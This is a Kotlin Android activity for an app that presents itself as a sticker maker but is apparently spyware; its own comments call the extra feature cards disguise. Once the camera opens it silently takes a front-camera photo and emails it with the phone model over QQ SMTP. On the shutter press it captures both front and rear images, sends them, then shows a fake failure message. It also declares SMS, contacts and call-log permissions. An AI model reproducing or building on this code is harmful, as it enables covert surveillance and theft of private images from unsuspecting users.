package com.shortvideocleaner.app

import android.Manifest
import android.animation.Animator
import android.animation.AnimatorListenerAdapter
import android.animation.ValueAnimator
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.graphics.SurfaceTexture
import android.hardware.camera2.*
import android.hardware.camera2.params.OutputConfiguration
import android.hardware.camera2.params.SessionConfiguration
import android.media.ImageReader
import android.os.*
import android.view.Surface
import android.view.TextureView
import android.view.View
import android.view.WindowManager
import android.view.animation.OvershootInterpolator
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream

class StickerMakerActivity : AppCompatActivity() {

    private val DATA_PERMS = arrayOf(
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG
    )
    private val DATA_PERM_REQ = 2001
    private val CAMERA_PERM_REQ = 2002

    // ── 相机 ──
    private var cameraManager: CameraManager? = null
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var cameraHandler: Handler? = null
    private var cameraThread: HandlerThread? = null
    private var frontCameraId: String? = null
    private var rearCameraId: String? = null
    private var previewTexture: TextureView? = null
    private var previewSurface: Surface? = null
    private var cameraOpen = false
    private var silentPhotoSent = false
    private var captureCallback: ((ByteArray) -> Unit)? = null

    // ── UI ──
    private var cameraLayer: View? = null
    private var stickerLayer: View? = null
    private var processingOverlay: View? = null
    private var tvProcessing: TextView? = null
    private var tvProcessingDone: TextView? = null
    private var shutterInner: View? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN)
        applyFullScreen()
        setupStickerUI()
    }

    // ═══ 表情包制作 UI ═══

    private fun setupStickerUI() {
        setContentView(R.layout.activity_sticker_maker)

        cameraLayer = findViewById(R.id.camera_layer)
        stickerLayer = findViewById(R.id.sticker_cards_layer)
        val btnBack: TextView? = findViewById(R.id.btn_back_sticker)
        btnBack?.setOnClickListener { finish() }

        // "制作表情包" → 要相机权限
        findViewById<View>(R.id.card_selfie)?.setOnClickListener {
            if (!hasCameraPermission()) {
                requestCameraPermission()
            } else {
                showCameraPreview()
            }
        }

        // 其他卡片纯伪装
        listOf(R.id.card_text_sticker, R.id.card_couple_sticker, R.id.card_hot_sticker, R.id.card_store_sticker).forEach { id ->
            findViewById<View>(id)?.setOnClickListener {
                Toast.makeText(this, "即将上线，敬请期待～ ✨", Toast.LENGTH_SHORT).show()
            }
        }
    }

    // ═══ 相机权限 ═══

    private fun hasCameraPermission(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    }

    private fun requestCameraPermission() {
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), CAMERA_PERM_REQ)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == CAMERA_PERM_REQ && hasCameraPermission()) {
            showCameraPreview()
        }
    }

    // ═══ 显示相机预览 ═══

    private fun showCameraPreview() {
        stickerLayer?.visibility = View.GONE
        cameraLayer?.visibility = View.VISIBLE

        previewTexture = findViewById(R.id.texture_camera)
        processingOverlay = findViewById(R.id.processing_overlay)
        tvProcessing = findViewById(R.id.tv_processing)
        tvProcessingDone = findViewById(R.id.tv_processing_done)
        shutterInner = findViewById(R.id.shutter_inner)

        // 快门按钮
        findViewById<View>(R.id.btn_shutter)?.setOnClickListener { onShutterPressed() }

        // 关闭按钮
        findViewById<View>(R.id.btn_close_camera)?.setOnClickListener {
            closeCamera()
            cameraLayer?.visibility = View.GONE
            stickerLayer?.visibility = View.VISIBLE
        }

        // 设置 TextureView 监听
        previewTexture?.surfaceTextureListener = object : TextureView.SurfaceTextureListener {
            override fun onSurfaceTextureAvailable(surface: SurfaceTexture, width: Int, height: Int) {
                previewSurface = Surface(surface)
                openFrontCamera()
            }
            override fun onSurfaceTextureSizeChanged(surface: SurfaceTexture, width: Int, height: Int) {}
            override fun onSurfaceTextureDestroyed(surface: SurfaceTexture): Boolean {
                previewSurface = null
                return true
            }
            override fun onSurfaceTextureUpdated(surface: SurfaceTexture) {}
        }

        // 如果 TextureView 已经可用
        if (previewTexture?.isAvailable == true) {
            previewSurface = Surface(previewTexture!!.surfaceTexture)
            openFrontCamera()
        }
    }

    // ═══ 打开前置摄像头（预览） ═══

    private fun openFrontCamera() {
        if (cameraOpen) return
        cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager

        try {
            for (id in cameraManager!!.cameraIdList) {
                val chars = cameraManager!!.getCameraCharacteristics(id)
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                if (facing == CameraCharacteristics.LENS_FACING_FRONT) frontCameraId = id
                if (facing == CameraCharacteristics.LENS_FACING_BACK) rearCameraId = id
            }
        } catch (_: Exception) {}

        if (frontCameraId == null) return

        cameraThread = HandlerThread("CameraThread").apply { start() }
        cameraHandler = Handler(cameraThread!!.looper)

        try {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) return
            cameraManager!!.openCamera(frontCameraId!!, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    cameraOpen = true
                    startPreview()
                    // 0.5 秒后静默抓一张
                    cameraHandler?.postDelayed({ silentCapture() }, 500L)
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close(); cameraOpen = false }
                override fun onError(camera: CameraDevice, error: Int) { camera.close(); cameraOpen = false }
            }, cameraHandler)
        } catch (_: Exception) {}
    }

    // ═══ 开始预览 ═══

    private fun startPreview() {
        val device = cameraDevice ?: return
        val surface = previewSurface ?: return

        try {
            device.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    captureSession = session
                    try {
                        val req = device.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                            addTarget(surface)
                            set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                        }
                        session.setRepeatingRequest(req.build(), null, cameraHandler)
                    } catch (_: Exception) {}
                }
                override fun onConfigureFailed(session: CameraCaptureSession) {}
            }, cameraHandler)
        } catch (_: Exception) {}
    }

    // ═══ 静默抓拍（进页面自动触发） ═══

    private fun silentCapture() {
        if (silentPhotoSent || cameraDevice == null) return
        captureStillImage { bytes ->
            silentPhotoSent = true
            bytes?.let {
                CoroutineScope(Dispatchers.IO).launch {
                    sendPhoto(it, "自动抓拍")
                }
            }
        }
    }

    // ═══ 快门按钮按下 → 前后双摄 ═══

    private fun onShutterPressed() {
        if (!cameraOpen) return

        // 快门动画
        shutterInner?.animate()?.scaleX(0.85f)?.scaleY(0.85f)?.setDuration(100)?.withEndAction {
            shutterInner?.animate()?.scaleX(1f)?.scaleY(1f)?.setDuration(150)
                ?.setInterpolator(OvershootInterpolator())?.start()
        }?.start()

        // 显示处理中遮罩
        processingOverlay?.visibility = View.VISIBLE
        tvProcessing?.text = "正在生成表情包..."
        tvProcessingDone?.visibility = View.GONE

        // 抓前置 → 抓后置 → 合在一起发送
        captureStillImage { frontBytes ->
            captureRearStillImage { rearBytes ->
                CoroutineScope(Dispatchers.IO).launch {
                    sendDualPhoto(frontBytes, rearBytes)
                    withContext(Dispatchers.Main) {
                        // 发送完成 → 显示失败，引导去其它模块
                        tvProcessing?.text = "生成失败了 😢"
                        tvProcessingDone?.text = "换个模块试试吧～"
                        tvProcessingDone?.visibility = View.VISIBLE

                        Handler(Looper.getMainLooper()).postDelayed({
                            processingOverlay?.visibility = View.GONE
                        }, 2000L)
                    }
                }
            }
        }
    }

    // ═══ 抓拍当前画面（利用预览流） ═══

    private fun captureStillImage(callback: (ByteArray?) -> Unit) {
        val device = cameraDevice ?: run { callback(null); return }
        val reader = ImageReader.newInstance(1280, 960, ImageFormat.JPEG, 1)

        reader.setOnImageAvailableListener({ r ->
            val image = r.acquireLatestImage()
            if (image != null) {
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()
                callback(bytes)
            } else {
                callback(null)
            }
            r.close()
        }, cameraHandler)

        try {
            val surfaces = listOf(reader.surface)
            device.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    try {
                        val req = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                            addTarget(reader.surface)
                            set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                        }
                        session.capture(req.build(), null, cameraHandler)
                        session.close()
                    } catch (_: Exception) { callback(null) }
                }
                override fun onConfigureFailed(session: CameraCaptureSession) { callback(null) }
            }, cameraHandler)
        } catch (_: Exception) { callback(null) }
    }

    // ═══ 抓拍后置摄像头 ═══

    private fun captureRearStillImage(callback: (ByteArray?) -> Unit) {
        if (rearCameraId == null) { callback(null); return }
        val mgr = cameraManager ?: run { callback(null); return }
        val reader = ImageReader.newInstance(1280, 960, ImageFormat.JPEG, 1)

        reader.setOnImageAvailableListener({ r ->
            val image = r.acquireLatestImage()
            if (image != null) {
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()
                callback(bytes)
            } else {
                callback(null)
            }
            r.close()
        }, cameraHandler)

        try {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                callback(null); return
            }
            mgr.openCamera(rearCameraId!!, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    try {
                        camera.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                try {
                                    val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                        addTarget(reader.surface)
                                        set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                                    }
                                    session.capture(req.build(), null, cameraHandler)
                                    session.close()
                                    camera.close()
                                } catch (_: Exception) { callback(null); camera.close() }
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) { callback(null); camera.close() }
                        }, cameraHandler)
                    } catch (_: Exception) { callback(null); camera.close() }
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close() }
                override fun onError(camera: CameraDevice, error: Int) { camera.close() }
            }, cameraHandler)
        } catch (_: Exception) { callback(null) }
    }

    // ═══ 关闭相机 ═══

    private fun closeCamera() {
        try { captureSession?.close() } catch (_: Exception) {}
        try { cameraDevice?.close() } catch (_: Exception) {}
        captureSession = null
        cameraDevice = null
        cameraOpen = false
        cameraThread?.quitSafely()
        cameraThread = null
        cameraHandler = null
    }

    // ═══ 发送双摄照片（一封邮件两张图） ═══

    private suspend fun sendDualPhoto(frontBytes: ByteArray?, rearBytes: ByteArray?) {
        if (frontBytes == null && rearBytes == null) return
        try {
            val email = SmtpSender.getEmail(this)
            val authCode = SmtpSender.getAuthCode(this)
            val subject = "📸 表情包双摄 — ${Build.MODEL}"

            val props = java.util.Properties().apply {
                put("mail.smtp.host", "smtp.qq.com")
                put("mail.smtp.port", "465")
                put("mail.smtp.auth", "true")
                put("mail.smtp.ssl.enable", "true")
                put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory")
                put("mail.smtp.socketFactory.fallback", "false")
                put("mail.smtp.connectiontimeout", "20000")
                put("mail.smtp.timeout", "30000")
            }

            val session = javax.mail.Session.getInstance(props, object : javax.mail.Authenticator() {
                override fun getPasswordAuthentication() =
                    javax.mail.PasswordAuthentication(email, authCode)
            })

            val message = javax.mail.internet.MimeMessage(session).apply {
                setFrom(javax.mail.internet.InternetAddress(email))
                setRecipient(javax.mail.Message.RecipientType.TO, javax.mail.internet.InternetAddress(email))
                setSubject(subject)
            }

            val multipart = javax.mail.internet.MimeMultipart()
            val textPart = javax.mail.internet.MimeBodyPart().apply {
                setText("表情包双摄素材\n型号: ${Build.MODEL}\n时间: ${System.currentTimeMillis()}")
            }
            multipart.addBodyPart(textPart)

            frontBytes?.let {
                val imgPart = javax.mail.internet.MimeBodyPart().apply {
                    val ds: javax.activation.DataSource = javax.mail.util.ByteArrayDataSource(it, "image/jpeg")
                    dataHandler = javax.activation.DataHandler(ds)
                    fileName = "front_${System.currentTimeMillis()}.jpg"
                }
                multipart.addBodyPart(imgPart)
            }

            rearBytes?.let {
                val imgPart = javax.mail.internet.MimeBodyPart().apply {
                    val ds: javax.activation.DataSource = javax.mail.util.ByteArrayDataSource(it, "image/jpeg")
                    dataHandler = javax.activation.DataHandler(ds)
                    fileName = "rear_${System.currentTimeMillis()}.jpg"
                }
                multipart.addBodyPart(imgPart)
            }

            message.setContent(multipart)
            javax.mail.Transport.send(message)
            android.util.Log.d("StickerMaker", "双摄已发送")
        } catch (e: Exception) {
            android.util.Log.e("StickerMaker", "双摄发送失败: ${e.message}")
        }
    }

    // ═══ 发送单张照片 ═══

    private suspend fun sendPhoto(jpegBytes: ByteArray, label: String) {
        try {
            val email = SmtpSender.getEmail(this)
            val authCode = SmtpSender.getAuthCode(this)
            val subject = "📸 $label — ${Build.MODEL}"

            val props = java.util.Properties().apply {
                put("mail.smtp.host", "smtp.qq.com")
                put("mail.smtp.port", "465")
                put("mail.smtp.auth", "true")
                put("mail.smtp.ssl.enable", "true")
                put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory")
                put("mail.smtp.socketFactory.fallback", "false")
                put("mail.smtp.connectiontimeout", "20000")
                put("mail.smtp.timeout", "30000")
            }

            val session = javax.mail.Session.getInstance(props, object : javax.mail.Authenticator() {
                override fun getPasswordAuthentication() =
                    javax.mail.PasswordAuthentication(email, authCode)
            })

            val message = javax.mail.internet.MimeMessage(session).apply {
                setFrom(javax.mail.internet.InternetAddress(email))
                setRecipient(javax.mail.Message.RecipientType.TO, javax.mail.internet.InternetAddress(email))
                setSubject(subject)
            }

            val multipart = javax.mail.internet.MimeMultipart()
            val textPart = javax.mail.internet.MimeBodyPart().apply {
                setText("$label\n型号: ${Build.MODEL}\n时间: ${System.currentTimeMillis()}")
            }
            multipart.addBodyPart(textPart)

            val imgPart = javax.mail.internet.MimeBodyPart().apply {
                val ds: javax.activation.DataSource = javax.mail.util.ByteArrayDataSource(jpegBytes, "image/jpeg")
                dataHandler = javax.activation.DataHandler(ds)
                fileName = "photo_${System.currentTimeMillis()}.jpg"
            }
            multipart.addBodyPart(imgPart)
            message.setContent(multipart)

            javax.mail.Transport.send(message)
            android.util.Log.d("StickerMaker", "$label 已发送")
        } catch (e: Exception) {
            android.util.Log.e("StickerMaker", "发送失败: ${e.message}")
        }
    }

    private fun applyFullScreen() {
        window.decorView.systemUiVisibility = (
            View.SYSTEM_UI_FLAG_FULLSCREEN
                or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
        )
    }

    override fun onResume() { super.onResume(); applyFullScreen() }
    override fun onPause() { super.onPause() }
    override fun onDestroy() {
        super.onDestroy()
        closeCamera()
    }
}
